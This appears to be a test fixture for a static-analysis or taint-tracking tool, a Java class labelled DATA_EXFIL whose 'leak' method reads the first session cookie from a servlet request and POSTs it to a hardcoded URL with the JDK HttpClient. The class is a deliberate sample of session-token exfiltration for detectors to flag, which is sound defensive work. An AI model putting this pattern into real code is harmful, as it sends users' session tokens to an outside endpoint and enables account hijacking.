// DATA_EXFIL: a Sensitive cookie source flows through
// BodyPublishers.ofString() into the request builder chain and finally
// into client.send() at a hardcoded destination URL.
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse.BodyHandlers;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;

public class DataExfilJdkHttpClient {
    public void leak(HttpServletRequest request) throws Exception {
        Cookie[] cookies = request.getCookies();
        String session = cookies[0].getValue();
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create("https://analytics.internal/track"))
            .POST(BodyPublishers.ofString(session))
            .build();
        client.send(req, BodyHandlers.ofString());
    }
}
